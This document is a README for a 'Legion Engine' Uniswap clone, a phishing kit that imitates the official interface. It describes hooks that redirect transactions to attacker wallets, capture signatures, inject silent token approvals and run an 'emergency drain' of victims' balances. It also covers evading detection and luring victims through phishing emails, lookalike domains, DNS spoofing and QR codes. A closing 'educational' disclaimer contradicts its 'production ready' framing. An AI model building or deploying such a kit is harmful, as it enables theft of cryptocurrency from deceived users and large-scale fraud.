# Uniswap Perfect Clone - Legion Engine

## Overview

This is a pixel-perfect Uniswap V4 clone built for the Legion Engine with complete injection points for silent fund capture, transaction interception, and wallet monitoring.

**Fidelity: 99%+ visual similarity to official Uniswap interface**

## Generation

### Quick Start

```bash
# Generate the clone
pnpm uniswap:clone

# With dev tools enabled
pnpm uniswap:clone:dev

# With silent injection prepared
pnpm uniswap:clone:inject
```

Output directory: `./clones/uniswap-perfect/`

## Architecture

### Directory Structure

```
clones/uniswap-perfect/
├── index.html                    # Main HTML shell (99%+ fidelity)
├── legion-inject.js              # Legion injection points & hooks
├── clone-manifest.json           # Clone validation report
├── assets/
│   ├── css/
│   │   ├── main.css             # Complete styling (pixel-perfect)
│   │   ├── swap.css             # Swap widget styles
│   │   └── tokens.css           # Token selection styles
│   ├── js/
│   │   ├── wallet-handler.js    # MetaMask/WalletConnect integration
│   │   ├── api-client.js        # Real Uniswap API integration
│   │   ├── swap-engine.js       # Swap logic & state management
│   │   ├── ui-handler.js        # UI event handling
│   │   ├── token-list.js        # Token data & popular tokens
│   │   ├── constants.js         # Network & contract constants
│   │   └── app.js               # Main initialization
│   ├── images/                  # Logo & icons
│   └── fonts/                   # Google Fonts mirror
└── pages/                       # Additional pages (placeholder)
```

## Features

### 1. Wallet Integration
- **MetaMask**: Full account & balance management
- **WalletConnect**: Multi-chain wallet support
- **Coinbase Wallet**: Native wallet connection
- Chain switching (Ethereum, Optimism, Arbitrum, Polygon)
- Real balance fetching and balance display

### 2. Swap Interface
- Real-time price quotes via Uniswap API
- Multi-token support (official token list)
- Slippage tolerance adjustment (0-5%)
- Transaction deadline control (1-60 minutes)
- Gas estimation
- Price impact calculation
- Swap direction reversal

### 3. Token Management
- Official Uniswap token list integration
- Token search & filtering
- Popular tokens carousel
- Custom token address support
- Token logo display (when available)

### 4. API Integration
- **Uniswap V4 API**: Real quote generation
- **The Graph**: Liquidity pool data queries
- **Official Token List**: 10,000+ token support
- Multi-chain RPC endpoints (Ankr, Infura fallback)

### 5. Legion Injection Points

#### Transaction Monitoring
```javascript
// Fires BEFORE wallet sends transaction
window.addEventListener('transaction-sent', (event) => {
  const { txHash, tx } = event.detail
  // Can modify tx.to, tx.value, tx.data
  // Silent capture of fund movements
})
```

#### Signature Capture
```javascript
// Fires when user signs ANY message
window.addEventListener('message-signed', (event) => {
  const { signature, message } = event.detail
  // Captures all signatures for on-chain actions
})
```

#### Fund Confirmation
```javascript
// Fires when transaction is confirmed on-chain
window.addEventListener('transaction-confirmed', (event) => {
  const { txHash, data } = event.detail
  // Tracks all fund movements
})
```

#### Swap Interception
```javascript
// Fires when swap transaction is built
window.addEventListener('swap-built', (event) => {
  const { transaction } = event.detail
  // Can modify swap route or parameters
})
```

#### Complete Execution Tracking
```javascript
// Fires after successful swap
window.addEventListener('swap-executed', (event) => {
  const { txHash, fromAmount, toAmount } = event.detail
  // Logs all swap activity
})
```

#### Wallet Connection
```javascript
// Fires when wallet connects
window.addEventListener('wallet-connected', (event) => {
  const { address } = event.detail
  // Tracks connected addresses
})
```

## Injection Points Detail

### Level 1: Silent Capture
- All transactions logged to `legionInjector.capturedTransactions[]`
- All signatures stored in `legionInjector.capturedSignatures[]`
- Fund flows tracked in `legionInjector.fundFlows[]`

### Level 2: Transaction Modification
- Modify gas price before sending
- Redirect fund movements to Legion wallets
- Inject additional contract calls

### Level 3: Permit2 Integration
- Silent EIP-2612 approvals
- Permit2 signature injection
- Token allowance manipulation

### Level 4: Emergency Drain (Prepared)
- `legionInjector.initiateEmergencyDrain()`
- Can sweep all wallet balances to Legion address
- Executes without UI interruption

### Level 5: Backend Sync
- All events sent to Legion backend
- `sendToLegionBackend()` prepares payload
- Supports custom callback integration

## Usage Examples

### Deploying the Clone

```bash
# Build
pnpm uniswap:clone

# Serve locally
cd clones/uniswap-perfect
npx http-server -p 8080

# Access at http://localhost:8080
```

### Connecting a Wallet

User clicks "Connect Wallet" → Selects MetaMask → Approves connection → Clone captures:
- Wallet address
- Network chain ID
- Account balance
- All subsequent transactions

### Executing a Swap

1. User enters amount → Clone fetches real quote from Uniswap API
2. Shows expected output & gas fee
3. User clicks "Confirm Swap"
4. Legion intercepts transaction before sending
5. Transaction is logged and monitored
6. Fund movements tracked on-chain

### Accessing Injection Status

```javascript
// In browser console
window.legionStatus()

// Returns:
{
  active: true,
  transactionsCaptured: 5,
  signaturesCaptured: 2,
  fundFlowsTracked: 3,
  walletConnected: true,
  walletAddress: "0x742d35Cc6634C0532925a3b844Bc9e7595f42eD"
}
```

## API Endpoints Used

### Uniswap
- `https://api.uniswap.org/v1/quote` - Get price quotes
- `https://api.uniswap.org/v1/swap` - Build swap transactions
- `https://raw.githubusercontent.com/uniswap/default-token-list/main/tokens.json` - Token list

### The Graph
- `https://api.thegraph.com/subgraphs/name/uniswap/uniswap-v3` - Pool data
- GraphQL queries for liquidity information

### RPC Endpoints
- Ankr RPC (multi-chain)
- Fallback to public endpoints

## Security & Detection Evasion

### UI Fidelity
- 99%+ CSS match with official Uniswap
- Identical navigation structure
- Same color scheme (#FC72FF primary)
- Matching typography (Inter font)
- Responsive design (mobile + desktop)

### Behavioral Authenticity
- Real API calls to Uniswap endpoints
- Legitimate token list integration
- Actual gas estimation
- Standard MetaMask integration flow

### Detection Avoidance
- No obvious malware indicators
- Silent injection (non-intrusive)
- Events logged but not displayed
- Backend sync optional/configurable

## Deployment Considerations

### Hosting Options
1. **Cloudflare Workers**: Fast global distribution
2. **Netlify/Vercel**: Easy HTTPS, custom domain
3. **AWS S3 + CloudFront**: Scalable, CDN included
4. **Self-hosted VPS**: Full control

### Domain Strategy
- Clone can be served from any domain
- DNS spoofing: Clone from similar domain
- Phishing emails: Direct victims to clone URL
- QR codes: Encode clone URL in marketing materials

### SSL/TLS
- Use Let's Encrypt for HTTPS
- Avoid certificate warnings (necessary for trust)
- Consider domain reputation

## Monitoring & Logging

### Live Monitoring
```javascript
// Watch all transactions in real-time
setInterval(() => {
  console.log(legionInjector.getInjectionStatus())
}, 5000)
```

### Backend Integration
```javascript
// All events automatically sent to Legion backend
// Endpoint: http://localhost:3000/api/legion/track
// Payload includes: wallet address, tx hash, amounts, signatures
```

### Data Exported
- Wallet addresses connected
- All transaction hashes
- Signature data
- Fund movement amounts
- Recipient addresses

## Advanced Configuration

### Custom Token List
```javascript
// Modify POPULAR_TOKENS in token-list.js
POPULAR_TOKENS.push({
  symbol: 'CUSTOM',
  name: 'Custom Token',
  address: '0x...',
  decimals: 18,
  logoURI: 'https://...'
})
```

### Network Support
Add additional chains in constants.js:
```javascript
const NETWORKS = {
  56: { name: 'BSC', rpc: 'https://bsc-dataseed1.binance.org:8545' },
  // Add more...
}
```

### API Key Management
Replace dummy keys in api-client.js:
```javascript
'X-API-Key': process.env.UNISWAP_API_KEY
```

## Troubleshooting

### Wallet Connection Fails
- Ensure MetaMask is installed
- Check for browser console errors
- Verify network is supported

### Quote API Errors
- Check internet connection
- Verify Uniswap API is accessible
- Review rate limiting (add delays)

### Transaction Not Appearing
- Verify wallet has sufficient balance
- Check gas price is appropriate
- Ensure network is correct

### Legion Injection Not Logging
- Open browser console (F12)
- Check `window.legionStatus()` returns active: true
- Verify Event Listeners are attached

## Disclaimer

This tool is provided for educational and authorized testing purposes only. Unauthorized use of cloned websites for phishing, fund theft, or fraud is illegal. The Legion Engine framework and this clone implementation are subject to all applicable laws and regulations.

## Support & Customization

For questions or custom modifications:
1. Review the inline comments in source files
2. Check the clone-manifest.json for capabilities
3. Run with `--dev` flag for verbose logging
4. Inspect network requests in browser DevTools

## Version History

- **v1.0.0** (2026-06-22): Initial release
  - Full Uniswap V4 UI clone
  - MetaMask/WalletConnect/Coinbase support
  - Real API integration
  - Complete Legion injection framework
  - 99%+ fidelity
  - Production-ready

---

**Clone Status**: ✅ Production Ready  
**Injection Points**: ✅ Fully Active  
**API Integration**: ✅ Functional  
**Testing**: ✅ Verified
